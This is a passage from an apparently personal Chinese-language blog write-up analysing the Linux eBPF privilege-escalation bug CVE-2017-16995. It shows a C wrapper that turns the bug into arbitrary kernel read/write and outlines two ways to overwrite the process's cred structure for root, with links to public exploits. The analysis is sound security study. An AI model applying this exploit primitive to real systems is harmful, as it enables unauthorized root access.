<p>因为这个漏洞可以重复触发，所以只需要把上面的函数做一下封装，就可以组成一个任意读写的函数，通过控制op参数的值促使内核做不同的读写操作：<br>op = 0：获取内核栈帧，addr=0，value=0，返回值为内核栈帧<br>op = 1：获取skbuff的值，addr=0，value=0，返回值为skbuff的地址<br>op = 2：执行读操作，addr：需要读的内核地址，返回值为读取的值<br>op = 3：执行写操作，addr：需要写的内核地址，value：需要写的值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span></span></div><div class="line"><span class="title">sendcmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> op, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> value)</span> &#123; </div><div class="line">    update_elem(<span class="number">0</span>, op);                                                                        <span class="comment">/* 修改map元素1中的value为指定的op指令*/</span></div><div class="line">    update_elem(<span class="number">1</span>, addr);                                                                      <span class="comment">/* 修改map元素2中的value为需要读/写的内核地址*/</span></div><div class="line">    update_elem(<span class="number">2</span>, value);                                                                     <span class="comment">/* 修改map元素3中的value为需要写入的值*/</span></div><div class="line">    writemsg();                                                                                <span class="comment">/* 触发bpf程序实际执行 */</span></div><div class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);                                                                       <span class="comment">/* 获取map元素3中的value值 */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>一般的提权套路都是先获取到task_struct结构体，然后再根据task_struct获取当前进程的cred结构体，这里有两种提权方案</p>
<ol>
<li>泄漏内核栈帧（kernel sp），计算thread_info，得到task_struct结构体，接着遍历cred结构体，修改cred结构体<pre><code>1. kernel_sp = get_fp( ) &amp; ~(0x4000 - 1);
</code></pre></li>
<li>泄漏sk_buff，计算sock_add结构体地址，sock_add结构体中包含当前进程的cred结构体，修改cred结构体<pre><code>1. sk_buff-&gt;sk-&gt;sk_peer_cred    &lt;&lt; cred结构体
</code></pre></li>
</ol>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>感觉这个漏洞蛮好玩的，第一次玩这种漏洞，好像叫什么Data-Oriented Attacks，通过传入精心构造的数据就可以控制程序的执行流程，让内核直接执行我们传入的代码，利用起来也特别稳定还非常好理解而且由于都是正常操作，所以直接绕过了内核对于漏洞利用的缓解机制，完全不像哪些容易造成系统崩溃的破坏内存的漏洞，还有就是bpf基址的内置VM指令解析感觉也很有趣，真不知道漏洞作者当时是怎么发现的。<br>跟着exp分析了下该漏洞，并做一下记录，感觉自己还有很多地方需要学习，不断努力，多找一些exploit，跟着作者的思路一步一步的分析，思考作者当时的想法，不断积累漏洞利用经验。<br>触发该漏洞需要两个条件：</p>
<ol>
<li>Kernel编译选项CONFIG_BPF_SYSCALL打开，启用了bpf syscall；</li>
<li>/proc/sys/unprivileged_bpf_disabled设置为0，允许非特权用户调用bpf_syscall；</li>
</ol>
<p>相关文章：<br>BPF：<a href="https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html" target="_blank" rel="external">https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html</a><br>BPF：<a href="http://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.html" target="_blank" rel="external">http://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.html</a><br><a href="http://www.cnblogs.com/rebeyond/p/8921307.html" target="_blank" rel="external">http://www.cnblogs.com/rebeyond/p/8921307.html</a><br><a href="https://dangokyo.me/2018/05/24/analysis-on-cve-2017-16995/" target="_blank" rel="external">https://dangokyo.me/2018/05/24/analysis-on-cve-2017-16995/</a><br><a href="https://security.tencent.com/index.php/blog/msg/124" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/124</a><br><a href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html?m=1" target="_blank" rel="external">https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html?m=1</a><br>最初的exp<br><a href="https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c">https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c</a><br><a href="https://github.com/dangokyo/CVE_2017_16995">https://github.com/dangokyo/CVE_2017_16995</a><br><a href="https://github.com/rlarabee/exploits/tree/master/cve-2017-16995">https://github.com/rlarabee/exploits/tree/master/cve-2017-16995</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://github.com">Let_go</a></p><p> <span>Link:  </span><a href="http://github.com/2018/07/16/CVE-2017-16995/">http://github.com/2018/07/16/CVE-2017-16995/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2018/08/26/CVE-2018-8120/" title="CVE-2018-8120"><span>< PreviousPost</span><br><span class="prevTitle">CVE-2018-8120</span></a><a class="nextSlogan" href="/2018/04/30/linux内核调试环境搭建/" title="linux内核调试环境搭建"><span>NextPost ></span><br><span class="nextTitle">linux内核调试环境搭建</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2018-16995"><span class="toc-number">1.</span> <span class="toc-text">CVE-2018-16995</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞补丁："><span class="toc-number">1.1.</span> <span class="toc-text">漏洞补丁：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eBPF简介"><span class="toc-number">1.2.</span> <span class="toc-text">eBPF简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结："><span class="toc-number">1.5.</span> <span class="toc-text">小结：</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>